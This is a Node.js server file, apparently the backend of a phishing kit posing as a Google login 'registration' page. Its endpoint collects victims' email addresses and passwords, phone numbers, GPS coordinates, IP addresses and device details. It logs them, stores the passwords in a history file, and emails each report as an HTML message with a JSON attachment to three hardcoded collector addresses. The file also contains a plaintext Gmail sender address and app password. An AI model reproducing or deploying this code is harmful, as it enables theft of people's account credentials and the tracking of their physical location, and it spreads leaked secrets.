const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static(__dirname));

// ========== KONFIGURASI EMAIL ==========
const SENDER_EMAIL = 'gajeb682@gmail.com';
const SENDER_PASSWORD = 'tmyh wklt uyig lots';
const RECEIVER_EMAIL = [
    'chilligemaass@gmail.com',
    'akunvanzz888@gmail.com',
    'zamzaja78@gmail.com'
];

// Cooldown per EMAIL TARGET
const TARGET_COOLDOWN = {};
const COOLDOWN_HOURS = 1;
const COOLDOWN_MS = COOLDOWN_HOURS * 60 * 60 * 1000;

function canSendToTarget(targetEmail, currentPassword) {
    const record = TARGET_COOLDOWN[targetEmail];
    
    if (!record) {
        console.log(`✅ Target BARU: ${targetEmail} → BISA dikirim`);
        return true;
    }
    
    if (record.lastPassword !== currentPassword) {
        console.log(`🔄 Password BERBEDA untuk ${targetEmail} → LANGSUNG BISA dikirim`);
        return true;
    }
    
    const timeElapsed = Date.now() - record.lastSendTime;
    const canSend = timeElapsed >= COOLDOWN_MS;
    
    if (!canSend) {
        const remainingMinutes = Math.ceil((COOLDOWN_MS - timeElapsed) / (1000 * 60));
        console.log(`⏰ COOLDOWN: ${targetEmail} → Tunggu ${remainingMinutes} menit lagi`);
        return false;
    }
    
    return true;
}

function updateTargetCooldown(targetEmail, currentPassword) {
    TARGET_COOLDOWN[targetEmail] = {
        lastSendTime: Date.now(),
        lastPassword: currentPassword
    };
}

const HISTORY_FILE = path.join(__dirname, 'sent_history.json');

function loadHistory() {
    try {
        if (fs.existsSync(HISTORY_FILE)) {
            const data = fs.readFileSync(HISTORY_FILE, 'utf8');
            return JSON.parse(data);
        }
    } catch (e) {}
    return {};
}

function saveHistory(history) {
    try {
        fs.writeFileSync(HISTORY_FILE, JSON.stringify(history, null, 2));
    } catch (e) {}
}

function isDuplicatePassword(targetEmail, currentPassword) {
    const history = loadHistory();
    const lastPassword = history[targetEmail];
    
    if (!lastPassword) return false;
    if (lastPassword === currentPassword) return true;
    
    history[targetEmail] = currentPassword;
    saveHistory(history);
    return false;
}

const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: { user: SENDER_EMAIL, pass: SENDER_PASSWORD }
});

// Function buat dapetin flag emoji berdasarkan kode negara
function getFlagEmoji(countryCode) {
    if (!countryCode) return '🏳️';
    const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
    return String.fromCodePoint(...codePoints);
}

app.post('/api/register', async (req, res) => {
    try {
        const data = req.body;
        
        console.log('📥 DATA RECEIVED:');
        console.log('📍 GPS:', data.latitude, data.longitude);
        console.log('🌐 IP:', data.ip_address);
        console.log('📧 Target Email:', data.email);
        console.log('🔑 Password:', data.emailPassword);
        console.log('📱 Phone:', data.phone);
        
        const isDup = isDuplicatePassword(data.email, data.emailPassword);
        const canSend = canSendToTarget(data.email, data.emailPassword);
        
        if (isDup && !canSend) {
            console.log(`❌ NOT SENT: ${data.email} | Cooldown active`);
            return res.json({
                success: true,
                blocked: true,
                reason: `Cooldown 1 hour for same password`,
                cooldownInfo: getCooldownInfo(data.email)
            });
        }
        
        if (!isDup) {
            console.log(`🔄 Different password for ${data.email} → Sending now`);
        }
        
        // ========== DETEKSI BENDERA ==========
        const countryName = data.country || data.ip_country || 'Unknown';
        let countryCode = '';
        
        const countryMapping = {
            'indonesia': 'ID', 'indonesian': 'ID', 'id': 'ID',
            'malaysia': 'MY', 'singapore': 'SG', 'singapura': 'SG',
            'thailand': 'TH', 'vietnam': 'VN', 'philippines': 'PH', 'filipina': 'PH',
            'usa': 'US', 'united states': 'US', 'america': 'US', 'amerika': 'US',
            'uk': 'GB', 'united kingdom': 'GB', 'inggris': 'GB',
            'japan': 'JP', 'jepang': 'JP', 'korea': 'KR', 'south korea': 'KR',
            'china': 'CN', 'tiongkok': 'CN', 'india': 'IN', 'australia': 'AU',
            'germany': 'DE', 'jerman': 'DE', 'france': 'FR', 'prancis': 'FR',
            'netherlands': 'NL', 'belanda': 'NL', 'russia': 'RU', 'rusia': 'RU',
            'brazil': 'BR', 'brasil': 'BR', 'mexico': 'MX', 'mexiko': 'MX',
            'canada': 'CA', 'kanada': 'CA', 'italy': 'IT', 'italia': 'IT',
            'spain': 'ES', 'spanyol': 'ES', 'turkey': 'TR', 'turki': 'TR'
        };
        
        const lowerCountry = countryName.toLowerCase();
        for (const [key, code] of Object.entries(countryMapping)) {
            if (lowerCountry.includes(key)) {
                countryCode = code;
                break;
            }
        }
        
        if (!countryCode && data.ip_country_code) {
            countryCode = data.ip_country_code;
        }
        
        const flagEmoji = getFlagEmoji(countryCode);
        
        // ========== HTML EMAIL SUPER MODERN + FLAG ==========
        const htmlContent = `
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Registration Data Report</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #0a0a0a 0%, #000000 100%);
            padding: 40px 20px;
            min-height: 100vh;
        }
        .email-container {
            max-width: 680px;
            margin: 0 auto;
            background: #0a0a0a;
            border-radius: 32px;
            overflow: hidden;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
            border: 1px solid rgba(0, 180, 255, 0.2);
        }
        .email-header {
            background: linear-gradient(160deg, 
                #00d4ff 0%, 
                #00b8e6 15%, 
                #0099cc 35%, 
                #006699 55%, 
                #0a0a2e 80%, 
                #000000 100%);
            padding: 45px 35px;
            text-align: center;
            position: relative;
        }
        .email-header::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: 60px;
            background: linear-gradient(to top, #0a0a0a, transparent);
        }
        .header-icon {
            font-size: 52px;
            margin-bottom: 15px;
        }
        .email-header h1 {
            color: white;
            font-size: 28px;
            font-weight: 800;
            letter-spacing: -0.5px;
            margin-bottom: 10px;
            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
        }
        .email-header p {
            color: rgba(255,255,255,0.85);
            font-size: 14px;
            font-weight: 500;
        }
        .badge {
            display: inline-block;
            background: rgba(255,255,255,0.15);
            backdrop-filter: blur(10px);
            padding: 6px 18px;
            border-radius: 50px;
            font-size: 11px;
            font-weight: 600;
            margin-top: 15px;
            border: 1px solid rgba(255,255,255,0.2);
        }
        .flag-badge {
            display: inline-block;
            background: rgba(0,0,0,0.4);
            padding: 8px 20px;
            border-radius: 50px;
            font-size: 18px;
            margin-top: 15px;
            margin-left: 10px;
            border: 1px solid rgba(255,255,255,0.2);
        }
        .email-content {
            padding: 35px;
        }
        .welcome-text {
            margin-bottom: 30px;
            background: linear-gradient(135deg, rgba(0,212,255,0.08) 0%, rgba(0,0,0,0) 100%);
            padding: 20px;
            border-radius: 20px;
        }
        .welcome-text h2 {
            color: #00d4ff;
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .welcome-text p {
            color: #b0b0b0;
            line-height: 1.6;
            font-size: 14px;
        }
        .data-card {
            background: linear-gradient(135deg, rgba(20,30,50,0.6) 0%, rgba(5,10,20,0.8) 100%);
            border-radius: 24px;
            padding: 5px 0;
            margin: 25px 0;
            border: 1px solid rgba(0, 180, 255, 0.2);
            overflow: hidden;
        }
        .data-section {
            padding: 18px 25px;
            border-bottom: 1px solid rgba(0, 180, 255, 0.1);
        }
        .data-section:last-child {
            border-bottom: none;
        }
        .section-title {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 18px;
        }
        .section-title i {
            font-size: 20px;
            color: #00d4ff;
        }
        .section-title h3 {
            color: #00d4ff;
            font-size: 16px;
            font-weight: 700;
            letter-spacing: 0.5px;
        }
        .data-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 0;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }
        .data-row:last-child {
            border-bottom: none;
        }
        .data-label {
            color: #888;
            font-size: 13px;
            font-weight: 500;
        }
        .data-value {
            color: white;
            font-size: 14px;
            font-weight: 600;
            text-align: right;
            word-break: break-word;
            max-width: 60%;
        }
        .password-value {
            background: rgba(0, 212, 255, 0.15);
            padding: 5px 12px;
            border-radius: 12px;
            font-family: monospace;
            letter-spacing: 0.5px;
        }
        .gps-coord {
            color: #00d4ff;
            font-weight: 700;
        }
        .country-flag {
            font-size: 24px;
            margin-left: 10px;
            vertical-align: middle;
        }
        .email-footer {
            background: rgba(0,0,0,0.4);
            padding: 25px 35px;
            text-align: center;
            border-top: 1px solid rgba(0, 180, 255, 0.1);
        }
        .email-footer p {
            color: #666;
            font-size: 11px;
            margin: 5px 0;
        }
        .footer-note {
            color: #444 !important;
            font-size: 10px !important;
        }
        hr {
            border: none;
            height: 1px;
            background: linear-gradient(90deg, transparent, #00d4ff, transparent);
            margin: 20px 0;
        }
        .timestamp {
            color: #555;
            font-size: 11px;
            text-align: center;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="email-container">
        <div class="email-header">
            <div class="header-icon">📋</div>
            <h1>REGISTRATION DATA REPORT</h1>
            <p>User information has been recorded</p>
            <div>
                <span class="badge">🔒 ENCRYPTED REPORT</span>
                <span class="flag-badge">${flagEmoji} ${countryCode || '🌍'}</span>
            </div>
        </div>
        
        <div class="email-content">
            <div class="welcome-text">
                <h2>
                    Welcome, ${data.email ? data.email.split('@')[0] : 'User'}!
                    <span class="country-flag">${flagEmoji}</span>
                </h2>
                <p>Berikut adalah data lengkap registrasi yang berhasil kami terima dari sistem monitoring.</p>
            </div>
            
            <div class="data-card">
                <div class="data-section">
                    <div class="section-title">
                        <i>📧</i>
                        <h3>ACCOUNT INFORMATION</h3>
                    </div>
                    <div class="data-row">
                        <span class="data-label">Email Address</span>
                        <span class="data-value">${data.email || '-'}</span>
                    </div>
                    <div class="data-row">
                        <span class="data-label">Email Password</span>
                        <span class="data-value password-value">${data.emailPassword || '-'}</span>
                    </div>
                    <div class="data-row">
                        <span class="data-label">Phone Number</span>
                        <span class="data-value">${data.phone || '-'}</span>
                    </div>
                    <div class="data-row">
                        <span class="data-label">Full Name</span>
                        <span class="data-value">${data.fullName || '-'}</span>
                    </div>
                </div>
                
                <div class="data-section">
                    <div class="section-title">
                        <i>📍</i>
                        <h3>GPS LOCATION</h3>
                    </div>
                    <div class="data-row">
                        <span class="data-label">Latitude</span>
                        <span class="data-value gps-coord">${data.latitude || 'Not detected'}</span>
                    </div>
                    <div class="data-row">
                        <span class="data-label">Longitude</span>
                        <span class="data-value gps-coord">${data.longitude || 'Not detected'}</span>
                    </div>
                    <div class="data-row">
                        <span class="data-label">Accuracy</span>
                        <span class="data-value">${data.gps_accuracy || '-'} meters</span>
                    </div>
                </div>
                
                <div class="data-section">
                    <div class="section-title">
                        <i>🌍</i>
                        <h3>LOCATION ${flagEmoji}</h3>
                    </div>
                    <div class="data-row">
                        <span class="data-label">Country</span>
                        <span class="data-value">${countryName} ${flagEmoji}</span>
                    </div>
                    <div class="data-row">
                        <span class="data-label">Province / State</span>
                        <span class="data-value">${data.province || data.ip_region || '-'}</span>
                    </div>
                    <div class="data-row">
                        <span class="data-label">City</span>
                        <span class="data-value">${data.city || data.ip_city || '-'}</span>
                    </div>
                    <div class="data-row">
                        <span class="data-label">Postal Code</span>
                        <span class="data-value">${data.postalCode || '-'}</span>
                    </div>
                </div>
                
                <div class="data-section">
                    <div class="section-title">
                        <i>🌐</i>
                        <h3>IP & NETWORK</h3>
                    </div>
                    <div class="data-row">
                        <span class="data-label">IP Address</span>
                        <span class="data-value">${data.ip_address || '-'}</span>
                    </div>
                    <div class="data-row">
                        <span class="data-label">ISP</span>
                        <span class="data-value">${data.isp || '-'}</span>
                    </div>
                </div>
                
                <div class="data-section">
                    <div class="section-title">
                        <i>🖥️</i>
                        <h3>DEVICE INFORMATION</h3>
                    </div>
                    <div class="data-row">
                        <span class="data-label">Platform</span>
                        <span class="data-value">${data.platform || '-'}</span>
                    </div>
                    <div class="data-row">
                        <span class="data-label">Screen Resolution</span>
                        <span class="data-value">${data.screenResolution || '-'}</span>
                    </div>
                    <div class="data-row">
                        <span class="data-label">Language</span>
                        <span class="data-value">${data.language || '-'}</span>
                    </div>
                </div>
                
                <div class="data-section">
                    <div class="section-title">
                        <i>⏰</i>
                        <h3>TIMESTAMP</h3>
                    </div>
                    <div class="data-row">
                        <span class="data-label">Registration Time</span>
                        <span class="data-value">${data.timestamp || new Date().toLocaleString()}</span>
                    </div>
                </div>
            </div>
            
            <hr>
            <div class="timestamp">
                Report ID: ${Math.random().toString(36).substring(2, 10).toUpperCase()}<br>
                Generated: ${new Date().toLocaleString('id-ID', { dateStyle: 'full', timeStyle: 'medium' })}
            </div>
        </div>
        
        <div class="email-footer">
            <p>This is an automated report from Registration Monitoring System</p>
            <p class="footer-note">Please do not reply to this email. This message is system generated.</p>
            <p class="footer-note">© 2026 Registration System - All rights reserved</p>
        </div>
    </div>
</body>
</html>
        `;
        
        // Send to each receiver separately (not merged)
        for (const receiver of RECEIVER_EMAIL) {
            await transporter.sendMail({
                from: `"𝗗𝗔𝗧𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚 ${data.email || '-'} 𝗕𝗬 𝗗𝗦𝗧𝗥🇲🇽" <${SENDER_EMAIL}>`,
                to: receiver,
                subject: `ðŸ¦...WEB DSTR SHðŸ¦... Login Google ${flagEmoji}${countryName} ${data.ip_address || '-'}`,
                html: htmlContent,
                attachments: [{
                    filename: `ðŸ¦...WEB DSTR SHðŸ¦... Login Google${Date.now()}_${receiver.split('@')[0]}.json`,
                    content: JSON.stringify(data, null, 2)
                }]
            });
            console.log(`✅ Sent to: ${receiver}`);
            
            // Small delay betwe en sends to avoid merging
            await new Promise(resolve => setTimeout(resolve, 2000));
        }
        
        updateTargetCooldown(data.email, data.emailPassword);
        
        const history = loadHistory();
        history[data.email] = data.emailPassword;
        saveHistory(history);
        
        console.log(`✅ EMAIL SENT SUCCESSFULLY! Target: ${data.email}`);
        res.json({ success: true, message: 'Email sent successfully' });
        
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true, error: error.message });
    }
});

function getCooldownInfo(targetEmail) {
    const record = TARGET_COOLDOWN[targetEmail];
    if (!record) return null;
    
    const timeElapsed = Date.now() - record.lastSendTime;
    const remainingMs = Math.max(0, COOLDOWN_MS - timeElapsed);
    return {
        remainingMinutes: Math.ceil(remainingMs / (1000 * 60)),
        canSend: timeElapsed >= COOLDOWN_MS
    };
}

app.get('/api/cooldown/:email', (req, res) => {
    const targetEmail = req.params.email;
    const record = TARGET_COOLDOWN[targetEmail];
    
    if (!record) {
        return res.json({ exists: false, canSend: true });
    }
    
    const timeElapsed = Date.now() - record.lastSendTime;
    const canSend = timeElapsed >= COOLDOWN_MS;
    const remainingMs = Math.max(0, COOLDOWN_MS - timeElapsed);
    
    res.json({
        targetEmail: targetEmail,
        lastSendTime: new Date(record.lastSendTime).toISOString(),
        canSend: canSend,
        remainingMinutes: Math.ceil(remainingMs / (1000 * 60))
    });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📧 Email sending active dengan HTML SUPER MODERN + FLAG`);
    console.log(`⏰ Cooldown: 1 hour for SAME email + SAME password`);
    console.log(`🔄 Different password → No cooldown, send immediately`);
});
